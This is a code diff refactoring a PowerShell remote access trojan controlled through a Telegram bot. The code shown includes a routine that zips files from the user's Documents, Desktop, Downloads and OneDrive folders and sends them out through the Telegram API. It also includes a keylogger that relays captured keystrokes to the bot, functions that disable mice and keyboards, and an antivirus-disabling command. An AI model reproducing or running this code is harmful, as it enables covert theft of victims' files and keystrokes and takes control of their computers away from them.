@@ -12,7 +12,6 @@ SEE README FOR MORE INFO
 
 #>
 #---------------------------------------------- SCRIPT SETUP -----------------------------------------------
-# Define User Variables
 $Token = "$tg"  # REPLACE $tg with Your Telegram Bot Token
 #-----------------------------------------------------------------------------------------------------------
 
@@ -46,12 +45,15 @@ $tick, $comp, $closed, $waiting, $glass, $cmde, $pause = $chars
 $scriptDirectory = Get-Content -path $MyInvocation.MyCommand.Name -Raw
 $Mts = New-Object psobject 
 $Mts | Add-Member -MemberType NoteProperty -Name 'chat_id' -Value $ChatID
+Function Post-Message{
+    $script:params = @{chat_id = $ChatID ;text = $contents}
+    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+    }
 
 # Message waiting for passphrase
 $contents = "$comp $env:COMPUTERNAME $waiting Waiting to Connect.."
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
-#--------------------------------------------------------- ACTION FUNCTIONS ------------------------------------------------------------
+Post-Message
+#---------------------------------------------------------- COMMAND FUNCTIONS ---------------------------------------------------------
 
 Function Options{
 $contents = "==============================================
@@ -83,8 +85,7 @@ Disable-HID   : Disable Mice and Keyboards
 Enable-HID    : Enable Mice and Keyboards
 
 =============================================="
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+Post-Message | Out-Null
 }
 
 Function Extra-Info{
@@ -119,14 +120,12 @@ This Eg. will scan 192.168.1.1 to 192.168.1.254
 ( PS`> Message 'Your Message Here!' )
 
 =============================================="
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+Post-Message | Out-Null
 }
 
 Function Close{
 $contents = "$comp $env:COMPUTERNAME $closed Connection Closed"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Post-Message
 rm -Path "$env:temp/tgc2.txt" -Force
 exit
 }
@@ -157,8 +156,7 @@ $currentZipSize = 0
 $index = 1
 $zipFilePath ="$env:temp/Loot$index.zip"
 $contents = "$env:COMPUTERNAME $tick Exfiltration Started.. (Stop with Killswitch)"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
+Post-Message | Out-Null
 If($Path -ne $null){$foldersToSearch = "$env:USERPROFILE\"+$Path}
 else{$foldersToSearch = @("$env:USERPROFILE\Documents","$env:USERPROFILE\Desktop","$env:USERPROFILE\Downloads","$env:USERPROFILE\OneDrive","$env:USERPROFILE\Pictures","$env:USERPROFILE\Videos")}
 If($FileType -ne $null){$fileExtensions = "*."+$FileType}
@@ -183,8 +181,7 @@ foreach ($folder in $foldersToSearch) {
                 $messages=ReceiveMSG
                     if ($messages.message.text -contains "kill") {
                     $contents = "$comp $env:COMPUTERNAME $closed Exfiltration Killed"
-                    $params = @{chat_id = $ChatID ;text = $contents}
-                    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+                    Post-Message
                     break
                     }
                 }
@@ -198,8 +195,7 @@ $zipArchive.Dispose()
 curl.exe -F chat_id="$ChatID" -F document=@"$zipFilePath" "https://api.telegram.org/bot$Token/sendDocument"  | Out-Null
 rm -Path $zipFilePath -Force
 $contents = "$env:COMPUTERNAME $tick Exfiltration Complete!"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params  | Out-Null
+Post-Message | Out-Null
 }
 
 Function Screenshot{
@@ -218,8 +214,7 @@ Remove-Item -Path $filePath
 
 Function Key-Capture {
 $contents = "$env:COMPUTERNAME $tick KeyCapture Started.. (Stop with Killswitch)"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+Post-Message | Out-Null
 $API = '[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)] public static extern short GetAsyncKeyState(int virtualKeyCode); [DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int GetKeyboardState(byte[] keystate);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int MapVirtualKey(uint uCode, int uMapType);[DllImport("user32.dll", CharSet=CharSet.Auto)]public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);'
 $API = Add-Type -MemberDefinition $API -Name 'Win32' -Namespace API -PassThru
 $LastKeypressTime = [System.Diagnostics.Stopwatch]::StartNew()
@@ -252,8 +247,7 @@ While ($true){
         $messages=ReceiveMSG
         if ($messages.message.text -contains "kill") {
         $contents = "$comp $env:COMPUTERNAME $closed KeyCapture Killed"
-        $params = @{chat_id = $ChatID ;text = $contents}
-        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+        Post-Message | Out-Null
         break
         }
     }
@@ -262,8 +256,7 @@ While ($true){
             $escmsgsys = $nosave -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
             $timestamp = Get-Date -Format "dd-MM-yyyy HH:mm:ss"
             $contents = "$glass Keys Captured : "+$escmsgsys
-            $params = @{chat_id = $ChatID ;text = $contents}
-            Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+            Post-Message | Out-Null
             $keyPressed = $false
             $nosave = ""
         }
@@ -444,21 +437,18 @@ Write-Output "Uninstalled."
 
 Function Pause-Session{
 $contents = "$env:COMPUTERNAME $pause Pausing Session.."
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Post-Message | Out-Null
 $script:AcceptedSession=""
 }
 
 Function Is-Admin{
 If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
     $contents = "$closed Current Session is NOT Admin $closed"
-    $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Post-Message | Out-Null
     }
     else{
     $contents = "$tick Current Session IS Admin $tick"
-    $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Post-Message | Out-Null
     }
 }
 
@@ -485,15 +475,13 @@ Function Toggle-Errors{
 If($global:errormsg -eq 0){
     $global:errormsg = 1
     $contents = "$tick Error Messaging ON $tick"
-    $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Post-Message | Out-Null
     return
     }
 If($global:errormsg -eq 1){
     $global:errormsg = 0
     $contents = "$closed Error Messaging OFF $closed"
-    $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params | Out-Null
+    Post-Message | Out-Null
     return
     }
 }
@@ -511,8 +499,7 @@ Function Disable-AV{
 
 Function Disable-HID{
     $contents = "$env:COMPUTERNAME $closed Disabling HID Inputs.."
-    $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+    Post-Message | Out-Null
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Disable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
@@ -521,14 +508,12 @@ Function Disable-HID{
 
 Function Enable-HID{
     $contents = "$env:COMPUTERNAME $tick Enabling HID Inputs.."
-    $params = @{chat_id = $ChatID ;text = $contents}
-    Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+    Post-Message | Out-Null
     $PNPMice = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Mouse'}
     $PNPMice.Enable()
     $PNPKeyboard = Get-WmiObject Win32_USBControllerDevice | %{[wmi]$_.dependent} | ?{$_.pnpclass -eq 'Keyboard'}
     $PNPKeyboard.Enable()
 }
-
 # --------------------------------------------- TELEGRAM FUCTIONS -------------------------------------------------
 
 Function ShowButtons{
@@ -554,8 +539,7 @@ while ($killint -eq 0) {
     Sleep 1
 }
 $contents = "$comp $env:COMPUTERNAME $tick Session Started"
-$params = @{chat_id = $ChatID ;text = $contents}
-Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+Post-Message
 }
 
 Function IsAuth{ 
@@ -563,8 +547,7 @@ param($CheckMessage)
     if (($messages.message.date -ne $LastUnAuthMsg) -and ($CheckMessage.message.text -like $PassPhrase) -and ($CheckMessage.message.from.is_bot -like $false)){
         $script:AcceptedSession="Authenticated"
         $contents = "$comp $env:COMPUTERNAME $tick Session Starting..."
-        $params = @{chat_id = $ChatID ;text = $contents}
-        Invoke-RestMethod -Uri $apiUrl -Method POST -Body $params
+        Post-Message
         ShowButtons
         return $messages.message.chat.id
     }Else{return 0}
